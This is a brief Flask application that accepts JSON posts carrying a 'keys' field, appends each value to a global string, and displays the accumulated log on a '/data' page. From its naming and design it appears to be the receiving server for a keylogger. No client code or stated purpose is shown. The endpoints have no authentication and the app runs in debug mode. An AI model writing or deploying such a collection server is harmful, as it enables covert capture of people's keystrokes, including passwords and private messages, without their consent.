from flask import Flask, request,render_template

app=Flask(__name__)

info=""
@app.route("/",methods=['POST'])
def home():
    global info
    data=request.get_json()
    keys=data["keys"]
    info+=keys
    return "success",200

@app.route("/data")
def data():
    return render_template("log.html",d=info)
    

if __name__=="__main__":
    app.run(debug=True)


